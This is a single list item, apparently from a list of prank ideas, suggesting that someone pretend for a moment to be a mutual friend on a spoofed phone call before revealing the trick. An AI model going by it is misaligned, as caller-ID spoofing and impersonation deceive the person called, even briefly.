+8. For a moment, pretend to be your mutual friend before explaining that you spoofed the call.
